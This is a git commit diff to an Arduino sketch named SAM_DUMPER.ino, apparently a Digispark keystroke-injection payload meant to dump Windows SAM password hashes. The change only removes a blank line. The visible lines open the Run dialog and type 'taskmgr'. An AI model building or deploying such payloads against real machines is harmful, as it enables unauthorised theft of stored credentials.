f6884daaafc7d715f44385579e97d5166a57ebe0
Shreyas Saunshi <67939784+ShreyasSaunshi@users.noreply.github.com>
2023-03-10 18:46:25 +0530

    Update SAM_DUMPER.ino

--- Payloads/SAM Dumper/SAM_DUMPER.ino
+++ Payloads/SAM Dumper/SAM_DUMPER.ino
@@ -7,7 +7,6 @@ void loop() {
   DigiKeyboard.update();
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.delay(3000);
- 
   DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
   DigiKeyboard.delay(200);
   DigiKeyboard.println("taskmgr"); //starting taskmgr
